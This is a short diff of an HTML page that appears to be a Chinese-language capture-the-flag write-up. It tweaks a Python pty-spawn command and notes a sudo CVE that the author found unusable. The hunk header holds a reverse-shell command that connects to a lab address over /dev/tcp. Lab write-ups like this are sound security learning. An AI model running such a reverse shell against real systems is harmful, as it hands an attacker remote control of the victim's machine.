@@ -231,7 +231,7 @@ nohup bash -i &gt;&amp; /dev/tcp/10.10.14.2/4444 0&gt;&amp;1</p>
 <p><img src="./7.png" alt=""></p>
 <blockquote>
 <p><code>su</code> 需要一个完全互动的 TTY，否则会报错 <code>su: must be run from a terminal</code>。切换 TTY：</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash">python -c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span></code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">python -c <span class="token string">'import pty;pty.spawn("/bin/bash")'</span></code></pre>
 <p><img src="./8.png" alt=""></p>
 </blockquote>
 <p>看一下 sudo 版本：<code>1.8.16</code>，查到一个漏洞 <a target="_blank" rel="noopener" href="https://paper.seebug.org/1057/">CVE-2019-14287</a>，但是无法利用，似乎还需要当前用户的密码？<br>
